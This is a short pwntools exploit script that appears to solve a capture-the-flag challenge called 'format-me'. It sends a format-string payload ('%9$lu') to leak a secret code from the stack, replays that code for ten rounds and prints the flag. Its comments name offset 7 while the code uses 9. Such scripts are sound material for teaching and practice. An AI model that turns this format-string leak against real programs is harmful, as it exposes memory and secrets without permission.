#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("format-me")

r = process([exe.path])
#r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line

for i in range(10):
    # Receive the "Recipient?" prompt
    r.recvuntil(b"Recipient? ")
    
    # Send format string to leak the code value from stack
    # The code variable is typically at offset 7 or 8 on the stack
    # We use %7$lu to read the 7th argument as an unsigned long
    r.sendline(b"%9$lu")
    
    # Receive the leaked value
    r.recvuntil(b"Sending to ")
    leak = r.recvline()
    
    # Extract the numeric value from the leaked line
    # Format: "12345678...\n"
    val = leak.strip()
    
    # Receive the "Guess?" prompt
    r.recvuntil(b"Guess? ")
    
    # Send the leaked code value as our guess
    r.sendline(val)
    
    # Wait for confirmation
    r.recvuntil(b"Correct")
    
    print(f"[+] Round {i+1}/10 completed")

# Receive and print the flag
r.recvuntil(b"Here's your flag: ")
print(r.recvline().decode())
r.close()